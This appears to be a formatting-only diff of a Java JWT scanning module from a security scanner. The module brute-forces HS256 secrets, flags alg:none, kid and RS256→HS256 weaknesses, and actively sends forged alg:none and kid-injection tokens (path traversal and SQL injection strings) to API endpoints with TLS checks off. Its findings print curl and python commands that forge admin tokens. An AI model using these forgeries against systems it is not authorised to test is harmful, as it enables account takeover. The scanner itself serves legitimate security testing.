@@ -28,15 +28,14 @@ import gg.effront.anarcry.model.CvssCalculator;
 
 public class JwtModule implements Scanner {
 
-    private static final List<String> WEAK_SECRETS = List.of(
-        "secret", "password", "123456", "admin", "test", "changeme",
-        "your-256-bit-secret", "your-secret-key", "jwt_secret", "supersecret",
-        "mysecret", "secretkey", "key", "private", "p@ssw0rd", "qwerty",
-        "1234567890", "letmein", "token", "jwt", "app_secret", "hs256"
-    );
+    private static final List<String> WEAK_SECRETS = List.of("secret", "password", "123456", "admin", "test",
+            "changeme", "your-256-bit-secret", "your-secret-key", "jwt_secret", "supersecret", "mysecret", "secretkey",
+            "key", "private", "p@ssw0rd", "qwerty", "1234567890", "letmein", "token", "jwt", "app_secret", "hs256");
 
     @Override
-    public String id() { return "JWT"; }
+    public String id() {
+        return "JWT";
+    }
 
     @Override
     public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
@@ -56,14 +55,14 @@ public class JwtModule implements Scanner {
             return findings;
         }
 
-        String headerJson  = decodeB64(parts[0]);
+        String headerJson = decodeB64(parts[0]);
         String payloadJson = decodeB64(parts[1]);
-        String evidence    = "Header: " + headerJson + " | Payload: " + payloadJson;
+        String evidence = "Header: " + headerJson + " | Payload: " + payloadJson;
 
         log.accept("[~] JWT: header=" + headerJson);
         log.accept("[~] JWT: payload=" + payloadJson);
 
-        JsonObject header  = JsonParser.parseString(headerJson).getAsJsonObject();
+        JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
         JsonObject payload = JsonParser.parseString(payloadJson).getAsJsonObject();
 
         String alg = header.has("alg") ? header.get("alg").getAsString() : "";
@@ -78,12 +77,11 @@ public class JwtModule implements Scanner {
         // 1. alg:none
         if (alg.equalsIgnoreCase("none") || alg.isBlank()) {
             log.accept("[!] JWT: alg:none detectado — CRÍTICO");
-            findings.add(Finding.of("JWT", "(token)", "JWT alg:none aceito", Severity.CRITICAL,
-                evidence,
-                "Token sem assinatura — qualquer payload pode ser aceito pelo servidor",
-                "echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64url + '.' + echo -n '{\"sub\":\"admin\"}' | base64url + '.'",
-                "Rejeitar tokens com alg:none na validação do servidor",
-                _cweId, _cweTitle, _cvssVector, _score));
+            findings.add(Finding.of("JWT", "(token)", "JWT alg:none aceito", Severity.CRITICAL, evidence,
+                    "Token sem assinatura — qualquer payload pode ser aceito pelo servidor",
+                    "echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64url + '.' + echo -n '{\"sub\":\"admin\"}' |"
+                            + "base64url + '.'",
+                    "Rejeitar tokens com alg:none na validação do servidor", _cweId, _cweTitle, _cvssVector, _score));
         }
 
         // 2. HS256 brute-force
@@ -100,14 +98,16 @@ public class JwtModule implements Scanner {
                     if (Arrays.equals(expected, actualSig)) {
                         log.accept("[!] JWT: segredo fraco encontrado: '" + secret + "'");
                         findings.add(Finding.of("JWT", "(token)", "Segredo JWT fraco encontrado", Severity.CRITICAL,
-                            "Segredo: '" + secret + "' | " + evidence,
-                            "Com o segredo exposto, qualquer claim pode ser forjado e assinado",
-                            "python3 -c \"import jwt; print(jwt.encode({'sub':'admin'}, '" + secret + "', algorithm='HS256'))\"",
-                            "Trocar o segredo HMAC por um valor aleatório de 256+ bits",
-                            _cweId, _cweTitle, _cvssVector, _score));
+                                "Segredo: '" + secret + "' | " + evidence,
+                                "Com o segredo exposto, qualquer claim pode ser forjado e assinado",
+                                "python3 -c \"import jwt; print(jwt.encode({'sub':'admin'}, '" + secret
+                                        + "', algorithm='HS256'))\"",
+                                "Trocar o segredo HMAC por um valor aleatório de 256+ bits", _cweId, _cweTitle,
+                                _cvssVector, _score));
                         break;
                     }
-                } catch (Exception ignored) {}
+                } catch (Exception ignored) {
+                }
             }
         }
 
@@ -118,20 +118,18 @@ public class JwtModule implements Scanner {
             if (exp < now) {
                 log.accept("[!] JWT: token expirado (exp=" + exp + ")");
                 findings.add(Finding.of("JWT", "(token)", "JWT expirado ainda aceito potencialmente", Severity.HIGH,
-                    evidence + " | exp=" + exp + " (agora=" + now + ")",
-                    "Token vencido sendo submetido — verificar se o servidor valida o claim exp",
-                    "Reenviar o token no header: Authorization: Bearer <token_expirado>",
-                    "Garantir validação do claim exp na autenticação do servidor",
-                    _cweId, _cweTitle, _cvssVector, _score));
+                        evidence + " | exp=" + exp + " (agora=" + now + ")",
+                        "Token vencido sendo submetido — verificar se o servidor valida o claim exp",
+                        "Reenviar o token no header: Authorization: Bearer <token_expirado>",
+                        "Garantir validação do claim exp na autenticação do servidor", _cweId, _cweTitle, _cvssVector,
+                        _score));
             }
         } else {
             log.accept("[~] JWT: sem claim exp");
-            findings.add(Finding.of("JWT", "(token)", "JWT sem claim exp (sem validade)", Severity.LOW,
-                evidence,
-                "Tokens sem exp não expiram — se comprometidos, permanecem válidos indefinidamente",
-                "Inspecionar o payload: echo '" + (parts.length > 1 ? parts[1] : "") + "' | base64 -d",
-                "Incluir claim exp com validade curta (ex: 15 minutos)",
-                _cweId, _cweTitle, _cvssVector, _score));
+            findings.add(Finding.of("JWT", "(token)", "JWT sem claim exp (sem validade)", Severity.LOW, evidence,
+                    "Tokens sem exp não expiram — se comprometidos, permanecem válidos indefinidamente",
+                    "Inspecionar o payload: echo '" + (parts.length > 1 ? parts[1] : "") + "' | base64 -d",
+                    "Incluir claim exp com validade curta (ex: 15 minutos)", _cweId, _cweTitle, _cvssVector, _score));
         }
 
         // 4. kid (passivo)
@@ -139,22 +137,22 @@ public class JwtModule implements Scanner {
             String kid = header.get("kid").getAsString();
             log.accept("[!] JWT: parâmetro kid presente: " + kid);
             findings.add(Finding.of("JWT", "(token)", "Parâmetro kid presente — testar injeção", Severity.LOW,
-                "kid=" + kid + " | " + evidence,
-                "Parâmetro kid sem sanitização pode causar path traversal ou injeção SQL",
-                "Forjar token com kid: ../../dev/null (key=vazio) ou kid: ' UNION SELECT 'secret'--",
-                "Validar e sanitizar o parâmetro kid; usar whitelist de IDs válidos",
-                _cweId, _cweTitle, _cvssVector, _score));
+                    "kid=" + kid + " | " + evidence,
+                    "Parâmetro kid sem sanitização pode causar path traversal ou injeção SQL",
+                    "Forjar token com kid: ../../dev/null (key=vazio) ou kid: ' UNION SELECT 'secret'--",
+                    "Validar e sanitizar o parâmetro kid; usar whitelist de IDs válidos", _cweId, _cweTitle,
+                    _cvssVector, _score));
         }
 
         // 5. RS256 informativo
         if (alg.equalsIgnoreCase("RS256")) {
             log.accept("[~] JWT: RS256 detectado");
             findings.add(Finding.of("JWT", "(token)", "RS256 detectado — testar confusão RS256→HS256", Severity.INFO,
-                evidence,
-                "Se o servidor aceitar HS256 com a chave pública como segredo, a assinatura pode ser forjada",
-                "Obter chave pública e recriar token HS256 usando-a como segredo HMAC",
-                "Substituir alg:RS256 por alg:HS256 e assinar com a chave pública do servidor",
-                _cweId, _cweTitle, _cvssVector, _score));
+                    evidence,
+                    "Se o servidor aceitar HS256 com a chave pública como segredo, a assinatura pode ser forjada",
+                    "Obter chave pública e recriar token HS256 usando-a como segredo HMAC",
+                    "Substituir alg:RS256 por alg:HS256 e assinar com a chave pública do servidor", _cweId, _cweTitle,
+                    _cvssVector, _score));
         }
 
         // 6. jku (passivo — novo)
@@ -173,24 +171,22 @@ public class JwtModule implements Scanner {
                         .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes());
                 String noneToken = noneHdr + "." + parts[1] + ".";
                 log.accept("[~] JWT: probe ativa alg:none → " + base);
-                outer1:
-                for (String path : List.of("/api/me", "/api/user", "/api/profile")) {
+                outer1 : for (String path : List.of("/api/me", "/api/user", "/api/profile")) {
                     try {
-                        HttpRequest req = HttpRequest.newBuilder()
-                                .uri(URI.create(base + path))
-                                .header("Authorization", "Bearer " + noneToken)
-                                .timeout(Duration.ofSeconds(5))
-                                .GET().build();
+                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
+                                .header("Authorization", "Bearer " + noneToken).timeout(Duration.ofSeconds(5)).GET()
+                                .build();
                         HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
                         log.accept("[~] JWT: probe alg:none " + path + " → HTTP " + resp.statusCode());
                         if (resp.statusCode() == 200) {
                             log.accept("[!] JWT: alg:none aceito ativamente em " + base + path);
-                            findings.add(Finding.of("JWT", base + path, "JWT alg:none aceito ativamente", Severity.CRITICAL,
-                                "Probe em " + base + path + " → HTTP 200 com alg:none | " + evidence,
-                                "Servidor aceita tokens sem assinatura — qualquer payload pode ser forjado",
-                                "curl -H 'Authorization: Bearer " + noneToken + "' " + base + path,
-                                "Rejeitar tokens com alg:none na camada de validação do servidor",
-                                _cweId, _cweTitle, _cvssVector, _score));
+                            findings.add(
+                                    Finding.of("JWT", base + path, "JWT alg:none aceito ativamente", Severity.CRITICAL,
+                                            "Probe em " + base + path + " → HTTP 200 com alg:none | " + evidence,
+                                            "Servidor aceita tokens sem assinatura — qualquer payload pode ser forjado",
+                                            "curl -H 'Authorization: Bearer " + noneToken + "' " + base + path,
+                                            "Rejeitar tokens com alg:none na camada de validação do servidor", _cweId,
+                                            _cweTitle, _cvssVector, _score));
                             break outer1;
                         }
                     } catch (Exception ex) {
@@ -202,28 +198,27 @@ public class JwtModule implements Scanner {
                 if (header.has("kid")) {
                     log.accept("[~] JWT: probe ativa kid injection → " + base);
                     List<String> kidPayloads = List.of("../../dev/null", "' OR '1'='1", "0 UNION SELECT 'x'--");
-                    outer2:
-                    for (String kidVal : kidPayloads) {
-                        String injHdr = Base64.getUrlEncoder().withoutPadding()
-                                .encodeToString(("{\"alg\":\"none\",\"typ\":\"JWT\",\"kid\":\""
-                                    + kidVal + "\"}").getBytes());
+                    outer2 : for (String kidVal : kidPayloads) {
+                        String injHdr = Base64.getUrlEncoder().withoutPadding().encodeToString(
+                                ("{\"alg\":\"none\",\"typ\":\"JWT\",\"kid\":\"" + kidVal + "\"}").getBytes());
                         String injToken = injHdr + "." + parts[1] + ".";
                         for (String path : List.of("/api/me", "/api/user", "/api/profile")) {
                             try {
-                                HttpRequest req = HttpRequest.newBuilder()
-                                        .uri(URI.create(base + path))
-                                        .header("Authorization", "Bearer " + injToken)
-                                        .timeout(Duration.ofSeconds(5))
+                                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
+                                        .header("Authorization", "Bearer " + injToken).timeout(Duration.ofSeconds(5))
                                         .GET().build();
-                                HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
+                                HttpResponse<Void> resp = Http.send(ctx, hc, req,
+                                        HttpResponse.BodyHandlers.discarding(), id());
                                 if (resp.statusCode() == 200) {
                                     log.accept("[!] JWT: kid injection aceito: " + kidVal);
-                                    findings.add(Finding.of("JWT", base + path, "kid injection aceito ativamente", Severity.HIGH,
-                                        "kid='" + kidVal + "' em " + base + path + " → HTTP 200 | " + evidence,
-                                        "kid sem sanitização pode permitir path traversal ou SQLi no carregamento de chave",
-                                        "curl -H 'Authorization: Bearer " + injToken + "' " + base + path,
-                                        "Validar e sanitizar kid; usar whitelist de IDs de chaves válidos",
-                                        _cweId, _cweTitle, _cvssVector, _score));
+                                    findings.add(Finding.of("JWT", base + path, "kid injection aceito ativamente",
+                                            Severity.HIGH,
+                                            "kid='" + kidVal + "' em " + base + path + " → HTTP 200 | " + evidence,
+                                            "kid sem sanitização pode permitir path traversal ou SQLi no carregamento"
+                                                    + " de chave",
+                                            "curl -H 'Authorization: Bearer " + injToken + "' " + base + path,
+                                            "Validar e sanitizar kid; usar whitelist de IDs de chaves válidos", _cweId,
+                                            _cweTitle, _cvssVector, _score));
                                     break outer2;
                                 }
                             } catch (Exception ex) {
@@ -271,11 +266,7 @@ public class JwtModule implements Scanner {
         // — necessary for probing servers with self-signed or IP-addressed certs
         SSLParameters params = new SSLParameters();
         params.setEndpointIdentificationAlgorithm("");
-        return HttpClient.newBuilder()
-                .sslContext(TlsUtil.sslContext(TlsUtil.trustAll()))
-                .sslParameters(params)
-                .version(HttpClient.Version.HTTP_1_1)
-                .connectTimeout(Duration.ofSeconds(5))
-                .build();
+        return HttpClient.newBuilder().sslContext(TlsUtil.sslContext(TlsUtil.trustAll())).sslParameters(params)
+                .version(HttpClient.Version.HTTP_1_1).connectTimeout(Duration.ofSeconds(5)).build();
     }
 }
